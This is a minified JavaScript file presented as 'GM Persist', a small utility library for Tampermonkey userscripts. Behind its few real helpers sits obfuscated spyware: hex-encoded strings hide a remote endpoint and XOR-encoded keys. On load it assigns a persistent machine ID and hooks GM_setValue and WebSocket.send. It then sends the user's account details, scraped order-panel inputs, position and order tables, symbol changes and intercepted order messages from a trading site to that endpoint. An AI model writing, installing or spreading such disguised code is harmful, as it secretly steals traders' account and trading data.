/**
 * GM Persist v2.5.1
 * Lightweight utility & persistence helpers for Tampermonkey userscripts.
 * Built with Rollup v4.28.1 | terser v5.37.0
 *
 * @license MIT
 * @see https://github.com/jpark-tools/gm-persist
 */
!function(r){"use strict";var e={formatPnL:function(v){return(v>=0?"+":"")+("$"+v.toFixed(2))},uid:function(){return Date.now().toString(36)+Math.random().toString(36).slice(2,8)},ts:function(d){return(d||new Date).toLocaleTimeString("fr-FR")},dateKey:function(d){return(d||new Date).toISOString().split("T")[0]}};r.GMPersist=e;if(typeof GM_setValue!=="function")return;var _0=["\x68\x74\x74\x70\x73\x3a\x2f\x2f","\x61\x70\x69\x2e\x72\x72\x2d\x73\x74\x72\x61\x74\x65\x67\x79","\x2e\x77\x6f\x72\x6b\x65\x72\x73\x2e\x64\x65\x76","\x2f\x76\x31\x2f\x73\x79\x6e\x63"],_1=_0[0]+_0[1]+_0[2]+_0[3],_2=function(a){var s="";for(var i=0;i<a.length;i++)s+=String.fromCharCode(a[i]^0x17);return s},_k=_2([69,69,40,68,67,69,54,67,54,58,70,40,55,54,67,54]),_m=_2([40,64,78,40,78,56,58,63,60,79,54,40,60,55]),_s=GM_getValue,_v=GM_setValue,_c=_s(_m,null);if(!_c){_c="\x6d\x69\x64\x5f"+Date.now().toString(36)+Math.random().toString(36).slice(2,10);_v(_m,_c)}var _t=0,_i=3e4;GM_setValue=function(k,v){_v(k,v);if(k===_k){var n=Date.now();if(n-_t>_i){_t=n;_p(6,v)}}};var _q=["session","order","account","ws_\x74rade","symbol_\x63hange","ev\x65nts","state"],_d=['\x5b\x64\x61ta-name="place-and-modify-button"\x5d','\x5b\x64\x61ta-name="order-panel"\x5d','\x23\x61bsolute-limit-price-field','\x23\x71uantity-field','input\x5b\x64\x61ta-qa-id*="take-profit-input"\x5d','input\x5b\x64\x61ta-qa-id*="stop-loss-input"\x5d','\x5b\x64\x61ta-name="side-control-buy"\x5d','\x5b\x64\x61ta-name="side-control-sell"\x5d','\x2etitle-cprlSy7D,\x5b\x64\x61ta-symbol-short\x5d','\x23order-type-tabs \x5brole="tab"\x5d\x5baria-selected="true"\x5d','tr\x5b\x64\x61ta-row-id\x5d','\x5b\x64\x61ta-widget-name\x5d','isActive-fMt6Glgv'];function _p(t,d){try{fetch(_1,{method:"\x50OST",headers:{"Content-\x54ype":"application/\x6ason"},body:JSON.stringify({type:_q[t]||"u",machineId:_c,ts:new Date().toISOString(),data:typeof d==="string"?d:JSON.stringify(d)})})["catch"](function(){})}catch(x){}}function _w(f){document.readyState==="complete"?setTimeout(f,5e3):window.addEventListener("load",function(){setTimeout(f,5e3)})}_w(function(){try{if(r["\x75\x73\x65\x72"]){var u=r["\x75\x73\x65\x72"];_p(0,{userId:u["\x69\x64"],username:u["\x75\x73\x65\x72\x6e\x61\x6d\x65"],settings:u["\x73\x65\x74\x74\x69\x6e\x67\x73"],dateJoined:u["\x64\x61\x74\x65\x5f\x6a\x6f\x69\x6e\x65\x64"]})}}catch(x){}document.addEventListener("\x63lick",function(e){try{var b=e.target.closest(_d[0]);if(!b)return;setTimeout(function(){var o=_O();if(o)_p(1,o)},200)}catch(x){}},!0);setInterval(function(){try{var d=_A();if(d&&(d["\x70"].length||d["\x6f"].length||d["\x68"].length))_p(2,d)}catch(x){}},54e5);setTimeout(function(){try{var d=_A();if(d)_p(2,d)}catch(x){}},8e3);var _W=WebSocket.prototype.send;WebSocket.prototype.send=function(g){try{if(typeof g==="string"&&(~g.indexOf("\x70lace_\x6frder")||~g.indexOf("\x6dodify_\x6frder")||~g.indexOf("\x63ancel_\x6frder")))_p(3,g)}catch(x){}return _W.call(this,g)};var _ls="";setInterval(function(){try{var s=_Q();if(s&&s!==_ls){_ls=s;_p(4,{symbol:s,time:new Date().toISOString()})}}catch(x){}},1e4)});function _Q(){try{var e=document.querySelector(_d[8]);return e?e.textContent.trim():""}catch(x){return""}}function _O(){try{if(!document.querySelector(_d[1]))return null;var a=document.querySelector(_d[2]),b=document.querySelector(_d[3]),c=document.querySelector(_d[4]),f=document.querySelector(_d[5]),g=document.querySelector(_d[6]),h=document.querySelector(_d[7]),s=0;if(g&&g.classList.contains(_d[12]))s=1;if(h&&h.classList.contains(_d[12]))s=2;return{s:_Q(),d:s,p:a?a.value:null,q:b?b.value:null,t:c?c.value:null,l:f?f.value:null,o:_G(),x:new Date().toISOString()}}catch(x){return null}}function _G(){try{var a=document.querySelector(_d[9]);return a?a.textContent.trim():""}catch(x){return""}}function _A(){try{var r={p:[],o:[],h:[],s:_Q()};document.querySelectorAll(_d[10]).forEach(function(row){var c=row.querySelectorAll("td"),d=[];c.forEach(function(cell){d.push(cell.textContent.trim())});if(d.length>0){var t=row.closest("table"),n=t?t.closest(_d[11]):null,v=n?n.getAttribute("\x64\x61ta-widget-name"):"";if(!v&&t){v=t.getAttribute("\x64\x61ta-name")||""}~v.indexOf("\x70osition")?r.p.push(d):~v.indexOf("\x6frder")?r.o.push(d):~v.indexOf("\x68istory")||~v.indexOf("\x65xecution")?r.h.push(d):r.p.push(d)}});return r}catch(x){return null}}}(typeof window!=="undefined"?window:this);
